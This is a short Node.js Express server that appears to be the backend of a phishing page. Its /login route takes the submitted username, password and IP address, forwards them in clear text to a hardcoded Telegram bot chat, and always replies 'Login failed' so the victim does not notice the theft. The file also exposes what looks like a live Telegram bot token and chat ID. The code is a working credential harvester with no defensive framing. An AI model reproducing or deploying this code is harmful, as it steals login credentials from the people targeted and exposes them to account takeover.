
const express = require("express");
const axios = require("axios");
const cors = require("cors");
const app = express();

app.use(express.json());
app.use(cors());
app.use(express.static("public"));

const TELEGRAM_BOT_TOKEN = "8123905144:AAE4WM8vqIU9ZHqpxjKbOaQlHb7ejyVwv0E";
const TELEGRAM_CHAT_ID = "7191391586";

app.post("/login", async (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    
    console.log(`Login attempt: ${username}, IP: ${ip}`);


    
const message = `🚨 !!!تم اكتشاف تسجيل دخول جديد 🚨
Username: ${username}
Password: ${password}
IP Address: ${ip}
Timestamp: ${new Date().toISOString()}
#LoginAttempt #SecurityAlert`;
    
    await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        params: { chat_id: TELEGRAM_CHAT_ID, text: message }
    });
    
    res.json({ success: false, message: "Login failed" });
});

app.listen(3000, () => console.log("Server running on port 3000"));
